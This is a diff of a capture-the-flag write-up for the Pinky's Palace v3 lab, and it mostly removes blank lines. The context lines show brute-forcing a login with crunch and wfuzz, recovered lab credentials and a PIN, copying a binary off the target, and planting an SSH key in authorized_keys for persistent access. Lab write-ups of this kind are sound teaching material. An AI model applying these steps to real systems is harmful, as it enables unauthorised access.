@@ -177,11 +177,9 @@ Browsing to the site we get a standard Drupal site and the `CANGELOG.txt` file c
 
 ![331218961.png]({{site.baseurl}}/Images/pp3/331218961.png)
 
-
 CHANGELOG.txt:
 
 ![331186195.png]({{site.baseurl}}/Images/pp3/331186195.png)
-
 
 Droopescan doesn’t reveal much we didn’t already know:
 
@@ -798,17 +796,11 @@ Using the word list generator tool crunch we can generate a list of every possib
 ```
 
 root@kali: crunch 5 5 1234567890 > pins.txt
-
 Crunch will now generate the following amount of data: 600000 bytes
-
 0 MB
-
 0 GB
-
 0 TB
-
 0 PB
-
 Crunch will now generate the following number of lines: 100000 
 
 root@kali: head pins.txt 
@@ -824,9 +816,7 @@ root@kali: head pins.txt
 11110
 ```
 
-
 We now have three word lists to cover the three inputs we need. 
-
 
 Hydra is a touchy beast, so we start by trying wfuzz:
 
@@ -867,13 +857,11 @@ ID           Response   Lines    Word     Chars       Payload
 000000018:   200        0 L      6 W      45 Ch       "root - FJ(J#J(R#J - 11128"
 ```
 
-
 We can see from this that all our failed responses have a 200 response code, 6 words and 45 characters. So we need to hide those to help make our terminal clear. We let that run for way longer than we should have before realising that it needs to make **7.2 Million requests…** So lets limit it to just usernames and passwords and see if we get anything:
 
 ```
 
 root@kali: wfuzz -t 250 --hh 45 -w users.txt -w pwds.txt -c -d "user=FUZZ&pass=FUZ2Z&pin=12345" http://192.168.1.148:8001/login.php 
-
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 
@@ -898,18 +886,13 @@ Requests/sec.: 37.93327
 
 Bingo! The credentials `pinkadmin:AaPinkSecaAdmin4467` give us a different response to the rest! 
 
-
 Looking in Burp to see why this is different and why it would have been impossible to notice in a browser as a human:
-
 
 ![346226729.png]({{site.baseurl}}/Images/pp3/346226729.png)
 
-
 Burp reveals that Pinky has sneakily left off the closing `</p>` tag which will change the response length, without changing what the response visually looks like.
 
-
 We can now hard-code the username and password in and run wfuzz again with just the pins to see if we can figure that out as well.
-
 
 ```
 
@@ -949,7 +932,6 @@ ID           Response   Lines    Word     Chars       Payload
 ...
 
 ```
-
 
 And we get a redirect when we use the pin 55849. Time to head over to the site and try all the creds.
 
@@ -1003,13 +985,9 @@ The flags added is interesting. We try adding garbage to it and see what happens
 
 ```
 pinksec@pinkys-palace:/home/pinksec/bin$ ./pinksecd -thoseguys
-
 [+] PinkSec Daemon [+]
-
 Options: -d: daemonize, -h: help
-
 Flags Added: -thoseguys
-
 Soon to be host of pinksec web application.
 ```
 
@@ -1049,7 +1027,6 @@ root@kali: file pinksecd
 pinksecd: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f075e983506c107b4e5fb6ecc19cc2bedc763092, not stripped
 ```
 
-
 Attempting to run the file locally we get an error that it cannot find a shared object library:
 
 ```
@@ -1058,9 +1035,7 @@ root@kali: ./pinksecd
 ./pinksecd: error while loading shared libraries: libpinksec.so: cannot open shared object file: No such file or directory
 ```
 
-
 Looking for it on the target machine we find the shared object and can copy that off as well:
-
 
 ```
 pinksec@pinkys-palace:/home/pinksec/bin$ find / -name libpinksec.so 2>/dev/null
@@ -1306,7 +1281,6 @@ $ whoami
 pinksecmanagement
 ```
 
-
 Attempting to upgrade our shell to /bin/bash we get an interesting error:
 
 ```
@@ -1359,7 +1333,6 @@ $ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKqOfyY0GYq9XP8rftHarWcvFv5Y4YGeuX
 
 $ chmod 600 /home/pinksecmanagement/.ssh/authorized_keys
 ```
-
 
 Now we can try logging in directly as pinksecmanagement:
 
